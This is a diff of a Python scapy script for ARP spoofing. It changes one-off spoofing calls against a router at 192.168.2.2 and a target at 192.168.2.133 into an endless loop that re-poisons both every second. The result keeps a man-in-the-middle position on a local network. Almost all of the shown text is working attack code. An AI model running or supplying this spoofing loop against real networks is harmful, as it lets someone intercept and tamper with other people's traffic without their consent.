@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import time
 
 # getting the MAC address of the target computer
 def get_mac(ip):
@@ -38,7 +39,8 @@ def arp_spoof(target_ip, fake_ip):
     scapy.send(ARP_packet)
 
 # trick the router and the target
-arp_spoof('192.168.2.133', '192.168.2.2')
-arp_spoof('192.168.2.2', '192.168.2.133')
-
+while True:
+    arp_spoof('192.168.2.133', '192.168.2.2')
+    arp_spoof('192.168.2.2', '192.168.2.133')
+    time.sleep(1)
 
